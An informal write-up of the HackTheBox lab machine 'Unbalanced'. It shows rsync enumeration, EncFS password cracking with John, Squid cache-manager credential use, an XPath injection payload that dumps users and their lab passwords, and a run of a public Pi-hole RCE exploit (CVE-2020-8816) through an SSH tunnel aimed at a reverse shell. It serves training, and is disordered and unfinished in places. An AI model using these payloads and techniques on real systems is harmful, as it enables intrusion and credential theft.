# Disclaimer
I highly recommend not reading further as it is filled with grammatical mistakes, was done extremely fast and is probably unfollowable. 

You have been warned. 

For the full writeup please see the report.

# HackTheBox Unbalanced Write-up

# Recon

nmap -sC -sV -oN unbalanced.nmap 10.10.10.200
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-14 13:50 EST
Nmap scan report for 10.10.10.200
Host is up (0.078s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 (RSA)
|   256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 (ECDSA)
|_  256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 (ED25519)
873/tcp  open  rsync      (protocol version 31)
3128/tcp open  http-proxy Squid http proxy 4.6
|_ http-server-header: squid/4.6
|_ http-title: ERROR: The requested URL could not be retrieved
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.24 seconds

The nmap output reveals that the target server has ports 22 (OpenSSH), 873 (rsync) and 3128 (http-proxy) open.

## rsync

[Rsync](https://en.wikipedia.org/wiki/Rsync) is a utility for efficiently transferring and synchronizing files between a computer and an external hard drive or across networked computers by comparing the modification times and size of files.

Connect to the associated port using netcat ([nc](https://linux.die.net/man/1/nc)) command line utility. Use the parameter '-v' to request a more elaborate verbose putput

nc -v 10.10.10.200 873

10.10.10.200: inverse host lookup failed: Unknown host
(UNKNOWN) [10.10.10.200] 873 (rsync) open
#list
@RSYNCD: 31.0
@ERROR: protocol startup error

Netcat seems to be unable to retrieve the hostname from the response: 10.10.10.200: inverse host lookup failed: Unknown host
Lets use rsync directly instead to try and see what modules are containing within this system.

rsync rsync://10.10.10.200
conf_backups    EncFS-encrypted configuration backups

Lets check whats containing within this encrypting file system configuratio by using rsync again but on the encrypted file system.
rsync rsync://10.10.10.200/conf_backup
drwxr-xr-x          4,096 2020/04/04 11:05:32 .
-rw-r--r--            288 2020/04/04 11:05:31 ,CBjPJW4EGlcqwZW4nmVqBA6
-rw-r--r--            135 2020/04/04 11:05:31 -FjZ6-6,Fa,tMvlDsuVAO7ek
-rw-r--r--          1,297 2020/04/02 09:06:19 .encfs6.xml
-rw-r--r--            154 2020/04/04 11:05:32 0K72OfkNRRx3-f0Y6eQKwnjn
-rw-r--r--             56 2020/04/04 11:05:32 27FonaNT2gnNc3voXuKWgEFP4sE9mxg0OZ96NB0x4OcLo-
-rw-r--r--            190 2020/04/04 11:05:32 2VyeljxHWrDX37La6FhUGIJS
-rw-r--r--            386 2020/04/04 11:05:31 3E2fC7coj5,XQ8LbNXVX9hNFhsqCjD-g3b-7Pb5VJHx3C1
-rw-r--r--            537 2020/04/04 11:05:31 3cdBkrRF7R5bYe1ZJ0KYy786
-rw-r--r--            560 2020/04/04 11:05:31 3xB4vSQH-HKVcOMQIs02Qb9,
-rw-r--r--            275 2020/04/04 11:05:32 4J8k09nLNFsb7S-JXkxQffpbCKeKFNJLk6NRQmI11FazC1
-rw-r--r--            463 2020/04/04 11:05:32 5-6yZKVDjG4n-AMPD65LOpz6-kz,ae0p2VOWzCokOwxbt,
-rw-r--r--          2,169 2020/04/04 11:05:31 5FTRnQDoLdRfOEPkrhM2L29P
-rw-r--r--            238 2020/04/04 11:05:31 5IUA28wOw0wwBs8rP5xjkFSs
-rw-r--r--          1,277 2020/04/04 11:05:31 6R1rXixtFRQ5c9ScY8MBQ1Rg
-rw-r--r--            108 2020/04/04 11:05:31 7-dPsi7efZRoXkZ5oz1AxVd-Q,L05rofx0Mx8N2dQyUNA,
-rw-r--r--          1,339 2020/04/04 11:05:32 7zivDbWdbySIQARaHlm3NbC-7dUYF-rpYHSQqLNuHTVVN1
-rw-r--r--          1,050 2020/04/04 11:05:31 8CBL-MBKTDMgB6AT2nfWfq-e
-rw-r--r--            152 2020/04/04 11:05:31 8XDA,IOhFFlhh120yl54Q0da
-rw-r--r--             29 2020/04/04 11:05:31 8e6TAzw0xs2LVxgohuXHhWjM
-rw-r--r--          5,721 2020/04/04 11:05:31 9F9Y,UITgMo5zsWaP1TwmOm8EvDCWwUZurrL0TwjR,Gxl0
-rw-r--r--          2,980 2020/04/04 11:05:31 A4qOD1nvqe9JgKnslwk1sUzO
-rw-r--r--            443 2020/04/04 11:05:31 Acv0PEQX8vs-KdK307QNHaiF
-rw-r--r--            935 2020/04/04 11:05:31 B6J5M3OP0X7W25ITnaZX753T
-rw-r--r--          1,521 2020/04/04 11:05:32 Chlsy5ahvpl5Q0o3hMyUIlNwJbiNG99DxXJeR5vXXFgHC1
-rw-r--r--          2,359 2020/04/04 11:05:31 ECXONXBBRwhb5tYOIcjjFZzh
-rw-r--r--          1,464 2020/04/04 11:05:32 F4F9opY2nhVVnRgiQ,OUs-Y0
-rw-r--r--            354 2020/04/04 11:05:32 FGZsMmjhKz7CJ2r-OjxkdOfKdEip4Gx2vCDI24GXSF5eB1
-rw-r--r--          3,275 2020/04/04 11:05:31 FSXWRSwW6vOvJ0ExPK0fXJ6F
-rw-r--r--             95 2020/04/04 11:05:31 IymL3QugM,XxLuKEdwJJOOpi
-rw-r--r--            340 2020/04/04 11:05:31 KPYfvxIoOlrRjTY18zi8Wne-
-rw-r--r--            158 2020/04/04 11:05:32 Kb-,NDTgYevHOGdHCYsSQhhIHrUGjiM6i2JZcl,-PKAJm0
-rw-r--r--            518 2020/04/04 11:05:31 Kpo3MHQxksW2uYX79XngQu-f
-rw-r--r--          1,448 2020/04/04 11:05:31 KtFc,DR7HqmGdPOkM2CpLaM9
-rw-r--r--            714 2020/04/04 11:05:31 Mv5TtpmUNnVl-fgqQeYAy8uu
-rw-r--r--            289 2020/04/04 11:05:31 MxgjShAeN6AmkH2tQAsfaj6C
-rw-r--r--          4,499 2020/04/04 11:05:31 Ni8LDatT134DF6hhQf5ESpo5
-rw-r--r--          2,187 2020/04/04 11:05:31 Nlne5rpWkOxkPNC15SEeJ8g,
-rw-r--r--            199 2020/04/04 11:05:32 OFG2vAoaW3Tvv1X2J5fy4UV8
-rw-r--r--            914 2020/04/04 11:05:32 OvBqims-kvgGyJJqZ59IbGfy
-rw-r--r--            427 2020/04/04 11:05:31 StlxkG05UY9zWNHBhXxukuP9
-rw-r--r--             17 2020/04/04 11:05:31 TZGfSHeAM42o9TgjGUdOSdrd
-rw-r--r--        316,561 2020/04/04 11:05:31 VQjGnKU1puKhF6pQG1aah6rc
-rw-r--r--          2,049 2020/04/04 11:05:31 W5,ILrUB4dBVW-Jby5AUcGsz
-rw-r--r--            685 2020/04/04 11:05:31 Wr0grx0GnkLFl8qT3L0CyTE6
-rw-r--r--            798 2020/04/04 11:05:31 X93-uArUSTL,kiJpOeovWTaP
-rw-r--r--          1,591 2020/04/04 11:05:31 Ya30M5le2NKbF6rD-qD3M-7t
-rw-r--r--          1,897 2020/04/04 11:05:31 Yw0UEJYKN,Hjf-QGqo3WObHy
-rw-r--r--            128 2020/04/04 11:05:31 Z8,hYzUjW0GnBk1JP,8ghCsC
-rw-r--r--          2,989 2020/04/04 11:05:31 ZXUUpn9SCTerl0dinZQYwxrx
-rw-r--r--             42 2020/04/04 11:05:31 ZvkMNEBKPRpOHbGoefPa737T
-rw-r--r--          1,138 2020/04/04 11:05:31 a4zdmLrBYDC24s9Z59y-Pwa2
-rw-r--r--          3,643 2020/04/04 11:05:31 c9w3APbCYWfWLsq7NFOdjQpA
-rw-r--r--            332 2020/04/04 11:05:31 cwJnkiUiyfhynK2CvJT7rbUrS3AEJipP7zhItWiLcRVSA1
-rw-r--r--          2,592 2020/04/04 11:05:31 dF2GU58wFl3x5R7aDE6QEnDj
-rw-r--r--          1,268 2020/04/04 11:05:31 dNTEvgsjgG6lKBr8ev8Dw,p7
-rw-r--r--            422 2020/04/04 11:05:31 gK5Z2BBMSh9iFyCFfIthbkQ6
-rw-r--r--          2,359 2020/04/04 11:05:31 gRhKiGIEm4SvYkTCLlOQPeh-
-rw-r--r--          1,996 2020/04/04 11:05:32 hqZXaSCJi-Jso02DJlwCtYoz
-rw-r--r--          1,883 2020/04/04 11:05:32 iaDKfUAHJmdqTDVZsmCIS,Bn
-rw-r--r--          4,572 2020/04/04 11:05:31 jIY9q65HMBxJqUW48LJIc,Fj
-rw-r--r--          5,068 2020/04/04 11:05:31 kdJ5whfqyrkk6avAhlX-x0kh
-rw-r--r--            657 2020/04/04 11:05:31 kheep9TIpbbdwNSfmNU1QNk-
-rw-r--r--            612 2020/04/04 11:05:31 l,LY6YoFepcaLg67YoILNGg0
-rw-r--r--             46 2020/04/04 11:05:31 lWiv4yDEUfliy,Znm17Al41zi0BbMtCbN8wK4gHc333mt,
-rw-r--r--          1,636 2020/04/04 11:05:31 mMGincizgMjpsBjkhWq-Oy0D
-rw-r--r--          1,743 2020/04/04 11:05:31 oPu0EVyHA6,KmoI1T,LTs83x
-rw-r--r--             52 2020/04/04 11:05:31 pfTT,nZnCUFzyPPOeX9NwQVo
-rw-r--r--          1,050 2020/04/04 11:05:31 pn6YPUx69xqxRXKqg5B5D2ON
-rw-r--r--            650 2020/04/04 11:05:31 q5RFgoRK2Ttl3U5W8fjtyriX
-rw-r--r--            660 2020/04/04 11:05:32 qeHNkZencKDjkr3R746ZzO5K
-rw-r--r--          2,977 2020/04/04 11:05:32 sNiR-scp-DZrXHg4coa9KBmZ
-rw-r--r--            820 2020/04/04 11:05:32 sfT89u8dsEY4n99lNsUFOwki
-rw-r--r--            254 2020/04/04 11:05:31 uEtPZwC2tjaQELJmnNRTCLYU
-rw-r--r--            203 2020/04/04 11:05:31 vCsXjR1qQmPO5g3P3kiFyO84
-rw-r--r--            670 2020/04/04 11:05:32 waEzfb8hYE47wHeslfs1MvYdVxqTtQ8XGshJssXMmvOsZLhtJWWRX31cBfhdVygrCV5

As to no surprise, these are all encrypted files. Lets download them.
rsync -avz rsync://10.10.10.200/conf_backups conf_backups

Searching online about EncFS decryption leads to the following [reference](https://security.stackexchange.com/questions/98205/breaking-encfs-given-encfs6-xml) which refers to the tool encfs2john.py. Let us download it and run it against our EncFS folder downloaded. As the decryption will produce a hash decryptable by [John](https://www.openwall.com/john/) we will be downloaded it too. 

python openwall-john-83a5e6b/run/encfs2john.py 
Usage: openwall-john-83a5e6b/run/encfs2john.py <EncFS folder>

The tool accepts an EnFS folder as input and returns a hash in John The Ripper format. Let's run the tool with the conf_backups folder name as an argument.

python openwall-john-83a5e6b/run/encfs2john.py conf_backups
conf_backups:$encfs$192*580280*0*20*99176a6e4d96c0b32bad9d4feb3d8e425165f105*44*1b2a580dea6cda1aedd96d0b72f43de132b239f51c224852030dfe8892da2cad329edc006815a3e84b887add

Let us save the returned hash locally in a file to then crack it.

echo -n "conf_backups:$encfs$192*580280*0*20*99176a6e4d96c0b32bad9d4feb3d8e425165f105*44*1b2a580dea6cda1aedd96d0b72f43de132b239f51c224852030dfe8892da2cad329edc006815a3e84b887add" > encfs2john_hash.txt

Let us now use John The Ripper to decrypt the hash and retrieve the password. Kali Linux comes preloaded with a wordlist to check against called rockyou.txt and located in /usr/share/wordlists/rockyou.txt. Let us use it for the wordlist against the hash retrieved.

The file comes ziped when a fresh install of kali linux is performed as such let us unzip it to then be able to load it in John The Ripper

sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

After running John The Ripper on the following hashed file we are returned that the encryption password is bubblegum.

john encfs2john_hash --wordlist=/usr/share/wordlists/rockyou.txt                                                                         1 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (EncFS [PBKDF2-SHA1 256/256 AVX2 8x AES])
Cost 1 (iteration count) is 580280 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bubblegum        (conf_backups)
1g 0:00:00:07 DONE (2020-12-18 07:02) 0.1418g/s 104.3p/s 104.3c/s 104.3C/s bambam..raquel
Use the "--show" option to display all of the cracked passwords reliably
Session completed

Let us explore the man pages for encfs to understand how to decrypt the folder.

FS_CONFIG=/home/vagrant/htb/unbalanced/conf_backups/.encfs6.xml encfs /home/vagrant/htb/unbalanced/conf_backups /home/vagrant/htb/unbalanced/decrypted_conf_backups 
EncFS Password: 

Inserting the password bubblegum when prompted decrypts the data contained in the file conf_backups.

Among the decrypted files we can see that a squid.conf is present. This must surely be the configuration file for the Squid Proxy on the port 3128. Let us explore this further.

The file contains 8000+ lines, let us use the stream editor provided in Linux to perform a regex search on the file.

sed '/^#/d' squid.conf | sed -r '/^\s*$/d'

* /^#/d deletes all commented lines from the file squid.conf
* | represents the pipe operator and will pass the response to the following command if successful
* -r use an extended regular expression
* /^\s*$/d finds all occurances of whitespaces and tabs and removes the ones after the last character in each line

Result:
------
acl localnet src 0.0.0.1-0.255.255.255  # RFC 1122 "this" network (LAN)
acl localnet src 10.0.0.0/8             # RFC 1918 local private network (LAN)
acl localnet src 100.64.0.0/10          # RFC 6598 shared address space (CGN)
acl localnet src 169.254.0.0/16         # RFC 3927 link-local (directly plugged) machines
acl localnet src 172.16.0.0/12          # RFC 1918 local private network (LAN)
acl localnet src 192.168.0.0/16         # RFC 1918 local private network (LAN)
acl localnet src fc00::/7               # RFC 4193 local private network range
acl localnet src fe80::/10              # RFC 4291 link-local (directly plugged) machines
acl SSL_ports port 443
acl Safe_ports port 80          # http
acl Safe_ports port 21          # ftp
acl Safe_ports port 443         # https
acl Safe_ports port 70          # gopher
acl Safe_ports port 210         # wais
acl Safe_ports port 1025-65535  # unregistered ports
acl Safe_ports port 280         # http-mgmt
acl Safe_ports port 488         # gss-http
acl Safe_ports port 591         # filemaker
acl Safe_ports port 777         # multiling http
acl CONNECT method CONNECT
http_access deny !Safe_ports
http_access deny CONNECT !SSL_ports
http_access allow manager
include /etc/squid/conf.d/\*
http_access allow localhost
acl intranet dstdomain -n intranet.unbalanced.htb
acl intranet_net dst -n 172.16.0.0/12
http_access allow intranet
http_access allow intranet_net
http_access deny all
http_port 3128
coredump_dir /var/spool/squid
refresh_pattern ^ftp:           1440    20%     10080
refresh_pattern ^gopher:        1440    0%      1440
refresh_pattern -i (/cgi-bin/|\?) 0     0%      0
refresh_pattern .               0       20%     4320
cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events
cachemgr_passwd disable all
cache disable

There's an access control rule for the intranet.unbalanced.htb subdomain, and a set of credentials are present. 

Squid proxy can perform a couple of different services. It can use authentication to ensure that only certain people can access the content behind it. It can also cache static content to speed up response times and reduce traffic to servers. As there's no authentication to proxy through this Squid, I decided to look at the caching. This is explained with the cachemgr_passwd [configuration directive](http://www.squid-cache.org/Doc/config/cachemgr_passwd/) which sets a password, and then allocats which actions can be taken with that password.


From the wiki link we can find that the URL to access CacheManager is /squid-internal-mgr/. Exploring the other reference about cachemgr_passwd reveals the required syntax cachemgr_passwd password action action ...

We can supply the password display above in order to access the actions authorized in squid.conf. Let us test the menu action:

curl --user 'cachemgr_passwd:Thah$Sh1' http://10.10.10.200:3128/squid-internal-mgr/menu
 index                  Cache Manager Interface                 disabled
 menu                   Cache Manager Menu                      protected
 offline_toggle         Toggle offline_mode setting             disabled
 shutdown               Shut Down the Squid Process             disabled
 reconfigure            Reconfigure Squid                       disabled
 rotate                 Rotate Squid Logs                       disabled
 pconn                  Persistent Connection Utilization Histograms    protected
 mem                    Memory Utilization                      protected
 diskd                  DISKD Stats                             protected
 squidaio_counts        Async IO Function Counters              disabled
 config                 Current Squid Configuration             disabled
 client_list            Cache Client List                       disabled
 comm_epoll_incoming    comm_incoming() stats                   disabled
 ipcache                IP Cache Stats and Contents             disabled
 fqdncache              FQDN Cache Stats and Contents           protected
 idns                   Internal DNS Statistics                 disabled
 redirector             URL Redirector Stats                    disabled
 store_id               StoreId helper Stats                    disabled
 external_acl           External ACL stats                      disabled
 http_headers           HTTP Header Statistics                  disabled
 info                   General Runtime Information             disabled
 service_times          Service Times (Percentiles)             disabled
 filedescriptors        Process Filedescriptor Allocation       protected
 objects                All Cache Objects                       protected
 vm_objects             In-Memory and In-Transit Objects        protected
 io                     Server-side network read() size histograms      disabled
 counters               Traffic and Resource Counters           protected
 peer_select            Peer Selection Algorithms               disabled
 digest_stats           Cache Digest and ICP blob               disabled
 5min                   5 Minute Average of Counters            protected
 60min                  60 Minute Average of Counters           protected
 utilization            Cache Utilization                       disabled
 histograms             Full Histogram Counts                   protected
 active_requests        Client-side Active Requests             disabled
 username_cache         Active Cached Usernames                 disabled
 openfd_objects         Objects with Swapout files open         disabled
 store_digest           Store Digest                            disabled
 store_log_tags         Histogram of store.log tags             disabled
 storedir               Store Directory Stats                   disabled
 store_io               Store IO Interface Stats                disabled
 store_check_cachable_stats     storeCheckCachable() Stats              disabled
 refresh                Refresh Algorithm Statistics            disabled
 delay                  Delay Pool Levels                       disabled

Invoking the fqdncache action returns the DNS cache and IP resolution statistics.

curl --user 'cachemgr_passwd:Thah$Sh1' http://10.10.10.200:3128/squid-internal-mgr/fqdncache
FQDN Cache Statistics:
FQDNcache Entries In Use: 13
FQDNcache Entries Cached: 11
FQDNcache Requests: 392
FQDNcache Hits: 0
FQDNcache Negative Hits: 58
FQDNcache Misses: 334
FQDN Cache Contents:

Address                                       Flg TTL Cnt Hostnames
10.10.15.31                                    N  -34126   0
127.0.1.1                                       H -001   2 unbalanced.htb unbalanced
::1                                             H -001   3 localhost ip6-localhost ip6-loopback
172.31.179.2                                    H -001   1 intranet-host2.unbalanced.htb
172.31.179.3                                    H -001   1 intranet-host3.unbalanced.htb
10.10.14.43                                    N  -25976   0
127.0.0.1                                       H -001   1 localhost
172.17.0.1                                      H -001   1 intranet.unbalanced.htb
ff02::1                                         H -001   1 ip6-allnodes
ff02::2                                         H -001   1 ip6-allrouters
10.10.14.186                                   N  -2889   0


We can see a few interesting things, we are aware that connections are allowd through to the internal netwrok of 172.16.0.0/12 (that's a big IP Space). Therefore from the above result we can see a few interesting things:

172.31.179.2                                    H -001   1 intranet-host2.unbalanced.htb
172.31.179.3                                    H -001   1 intranet-host3.unbalanced.htb
172.17.0.1                                      H -001   1 intranet.unbalanced.htb


All of these proxies are in the 172.16.0.0/12 network range, we can access all of them using the proxy. Lets do it. 

All of these hosts have the same content and the login functionality seen earlier, and simple testing on the login form indicates that it does not seem vulernable to SQL injections. Lets try to access intranet-host1.unblanaced.htb and see if it exists on the network.

The proxy returns that Access Denied when using the hostpath because the squid proxy cannot retrieve the URL. Lets try to access 172.31.179.1 instead, as the other identifier hostnames contained a numeric identifier that mapped to the last octet of the assigned IP.

The error message states that the host has been removed from the load balancing pool in order to undergo security maintenance. Lets send a cURL request.

curl -v --proxy http://10.10.10.200:3128 http://172.31.179.1
*   Trying 10.10.10.200:3128...
* Connected to 10.10.10.200 (10.10.10.200) port 3128 (#0)
> GET http://172.31.179.1/ HTTP/1.1
> Host: 172.31.179.1
> User-Agent: curl/7.72.0
> Accept: */*
> Proxy-Connection: Keep-Alive
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.14.0 (Ubuntu)
< Date: Fri, 18 Dec 2020 17:23:14 GMT
< Content-Type: text/html; charset=UTF-8
< Intranet-Host: intranet-host1.unbalanced.htb
< X-Cache: MISS from unbalanced
< X-Cache-Lookup: MISS from unbalanced:3128
< Transfer-Encoding: chunked
< Via: 1.1 unbalanced (squid/4.6)
< Connection: keep-alive
< 
Host temporarily taken out of load balancing for security maintenance.
* Connection #0 to host 10.10.10.200 left intact


The Intranet-Host header shows the intranet-host1.unbalanced.htb hostname. As the error refers to security maintenance, its worth enumerating this host further. Let's access /intranet.php (the redirect which occurs when accessing intranet-host2.unbalanced.htb and intranet-host3.unbalanced.htb. Within this hostname when we submit the form we are responded with an error message Invalid Credentials. This is good sign.

The default credentials did not work, SQLMap also was not able to identifiy an injection. Let's change the browser proxy address to 128.0.0.1:8080 and launch BurpSuit.

As kali linux no longer runs as a root user out of the box. The embedded webrowser sanbox was unable to load, if this occurs, you will need to change the settings in Project Options > Misc > Allow embedded browser to run without sandbox. Once this is done, click open embedded browser and make sure it runs. Once that is done navigate to Project Options > Connections > Upstream Proxy Servers and Add a new upstream proxy rule as shown in the image below.

Kali Linux on virtualbox is attrociously slow so fuck it. Lets use our brain.

I know that if I try a false credential I get invalid credentials returned. When I put a ' the error message disappears. This made me think that this was an SQL injection, but the website is not built with SQL so I then moved on to thinking this was an XPath Injection.

Researching about XPATh injections I stumbled upon an explaination which depicted the commonly used payload ' or 1=1 or 'a'='a, using this query as the username and password weirdly returns a list of all employees registered in the system. Lets take note of these.

Rita Fubelli
rita@unbalanced.htb
Role: HR Manager

Jim Mickelson
jim@unbalanced.htb
Role: Web Designer

Bryan Angstrom
bryan@unbalanced.htb
Role: System Administrator

Sarah Goodman
sarah@unbalanced.htb
Role: Team Leader


Let us pull our attention to Bryan, he is the system administrator so he is the one we want to pawn.


# XPath Background
XPath, or XML Path Language, is a language for selecting nodes from an XML document. And like many query languages, it can be injected into. A typical query from the server side to check a login using XPATH would look something like this:

http://projects.webappsec.org/w/page/13247005/XPath%20Injection

Its of the form:
string(//user[name/text()='username' and password/text()='password']/account/text())

This says to get the user node which has a child nodes name and password, and checks that the text values of those notes match the input username and input password. Then it selects the account child node from that user and returns the text as a string.

This basic XPATH injection works because of how XPATH handles groupping of multiple 'or' and 'and'. When I submit the username of ' or 1=1 or 'a'='a, then the above node selection becomes

//user[name/text()='' or 1=1 or 'a'='a' and password/text()='' or 1=1 or 'a'='a']

XPath will group these boolean as:

//user[(name/text()='' or 1=1) or ('a'='a' and password/text()='' or 1=1) or ('a'='a')]

Which ultimately becomes:

//user[(false or true) or (true and false) or (true)]
//user[true or false or true]
//user[true]

which then requests: //user[true]/account/text()

and thus returns all users.

If BurpSuit would have worked I could have simply request the string-length of password for the user bryan but as Kali Linux was unusuable I had to turn to other measures. Analyzing the way XPath works we can write a simple script to filter through the XML and retrieve the password through the use of a Brute Force attack.

After execution of the script we have successfully retrieved the password of all users:

bryan:ireallyl0vebubblegum!!!
rita:password01!
jim:stairwaytoheaven
sarah:sarah4evah

These have been saved to file called passwords.txt

As we known from our nmap scan earlier that ssh is open, lets login with the retrieved password and retrieve the user flag to then input into hackthebox and have the user officiall pawnd.

After ssh login the user contains a file called user.txt which returns the flag to be entered in hackthebox.

cat user.txt
1d120ccc329f124b9670244936819cc1

Analysing the home directory of bryan we can see that there is a TODO file. Let us examine this.

cat TODO
############
# Intranet #
############
* Install new intranet-host3 docker [DONE]
* Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE]
* Test intranet-host3 [DONE]
* Add intranet-host3 to load balancer [DONE]
* Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE]
* Fix intranet-host2 [DONE]
* Re-add intranet-host2 to load balancer (set default weight) [DONE]
- Fix intranet-host1 [TODO]
- Re-add intranet-host1 to load balancer (set default weight) [TODO]

###########
# Pi-hole #
###########
* Install Pi-hole docker (only listening on 127.0.0.1) [DONE]
* Set temporary admin password [DONE]
* Create Pi-hole configuration script [IN PROGRESS]
- Run Pi-hole configuration script [TODO]
- Expose Pi-hole ports to the network [TODO]

The intranet section explains the vulnerabilities and configuration thus far. This Pi-Hole section is new.
* There's a Pi-Hole running in a docker container and listening on port 127.0.0.1 (i.e. localhost)
* The admin passward was changed from the default (bummer)
* There's a configuration script somewhere that hasn't yet been run.

This configuration script has still not been run, lets examine this further to hopefully gain priviliege escalation and pawn the root user too. Netstat is not installed on the target machine. Lets use netcat instead in order to see the open ports locally. Lets ask it to enumerate through ports 1 to 10000 and hopefully see whats open. 

nc -z -v 127.0.0.1 1-10000
localhost [127.0.0.1] 8080 (http-alt) open
localhost [127.0.0.1] 5553 (?) open
localhost [127.0.0.1] 3128 (?) open
localhost [127.0.0.1] 873 (rsync) open
localhost [127.0.0.1] 22 (ssh) open

This returns two additional results: an http sever running on 8080 and an open but unknown usage on port 5553. Lets cURL localhost on port 8080 and see what we are returned:

[ERROR]: Unable to parse results from <i>queryads.php</i>: <code>Unhandled error message (<code>Invalid domain!</code>)</code>

This is a reponse from the Pi-Hole server. Queryads.php is a file containing in the Pi-Hole project. This is a good sign. Lets give it a hostattribute and see if it returns something more interesting:

A pi-hole page was returned. Within it we can also see a hostname and IP adress pihole.unbalanced.htb/172.31.11.3

Lets access it in the webbrowser. The first thing visible is it request to go to the home page. Let us redirect and once in we can see the versions running pihole. After a few minutes of googling we can see that this specific version 4.3.2 is vunerable to Remote Code Execute [CVE-2020-8816](https://github.com/AndreyRainchik/CVE-2020-8816).

Lets first login to the system. We known from the TODO file that a tempory admin password has been set, lets try admin. It works. We are in.

SSH Tunnel For Explotation Required
-----------------------------------
Since the service is listening locally on the target machine, I created an SSH tunnel and performed the exploitation on my machine. Now I can access the service on my localhost on port 8081.

# Creates the SSH Tunnel on port 8081
ssh -N -L 8081:127.0.0.1:8080 bryan@10.10.10.200

# Execute the CVE downloaded
python3 CVE-2020-8816.py http://127.0.0.1:8081 admin 10.10.10.4 9000                                                                         Attempting to verify if Pi-hole version is vulnerable
Logging in...
Login succeeded
Grabbing CSRF token
Attempting to read $PATH
Pihole is vulnerable and served's $PATH allows PHP
Sending payload

# Use Netcat to get into the shell



Having already installed a Pi-Hole at home and messed around with the configuration, from here the steps were easy. 



## http-proxy
The http-proxy is running a [Squid](http://www.squid-cache.org/) instance. Squid is a caching proxy for the Web supporting HTTP, HTTPS, FTP and more. It acts as a middleware and caches the frequently requested contents and serves them resulting in reduced bandwidth, network congestion and thus improving response time.

Since squid is a caching and forwarding HTTP web proxy server. Let's configure the proxy in our browser. Firefox will be used as it provides an easily connection setting for proxy access.

At a primary glance we can see that all links are dead except for the login form. We have tried to use the credentials recevied from squid.conf but nothing works. In general, proxy servers append some headers to route the requests to the intended servers or to mange the caching behaviour. Let's use cURL to send a request to intranet.unbalanced.htb

curl -v --proxy http://10.10.10.200:3128 http://intranet.unbalanced.htb
*   Trying 10.10.10.200:3128...
* Connected to 10.10.10.200 (10.10.10.200) port 3128 (#0)
> GET http://intranet.unbalanced.htb/ HTTP/1.1
> Host: intranet.unbalanced.htb
> User-Agent: curl/7.72.0
> Accept: */*
> Proxy-Connection: Keep-Alive
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
< Server: nginx/1.14.0 (Ubuntu)
< Date: Fri, 18 Dec 2020 14:57:34 GMT
< Content-Type: text/html; charset=UTF-8
< Location: intranet.php
< Intranet-Host: intranet-host3.unbalanced.htb
< X-Cache: MISS from unbalanced
< X-Cache-Lookup: MISS from unbalanced:3128
< Transfer-Encoding: chunked
< Via: 1.1 unbalanced (squid/4.6)
< Connection: keep-alive
< 
* Connection #0 to host 10.10.10.200 left intact

The returned response reveals the host name intranet-host3.unbalanced.htb. Issuing a secondary request returns the name intranet-host2.unbalanced.htb. Let us examine this further.

curl -v --proxy http://10.10.10.200:3128 http://intranet.unbalanced.htb
*   Trying 10.10.10.200:3128...
* Connected to 10.10.10.200 (10.10.10.200) port 3128 (#0)
> GET http://intranet.unbalanced.htb/ HTTP/1.1
> Host: intranet.unbalanced.htb
> User-Agent: curl/7.72.0
> Accept: */*
> Proxy-Connection: Keep-Alive
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
< Server: nginx/1.14.0 (Ubuntu)
< Date: Fri, 18 Dec 2020 15:00:33 GMT
< Content-Type: text/html; charset=UTF-8
< Location: intranet.php
< Intranet-Host: intranet-host2.unbalanced.htb
< X-Cache: MISS from unbalanced
< X-Cache-Lookup: MISS from unbalanced:3128
< Transfer-Encoding: chunked
< Via: 1.1 unbalanced (squid/4.6)
< Connection: keep-alive
<
* Connection #0 to host 10.10.10.200 left intact

There seems to be some sort of load balancing mechanism in place to handle the requests. From the squid.conf file we also have a cachemgr_passwd entry 
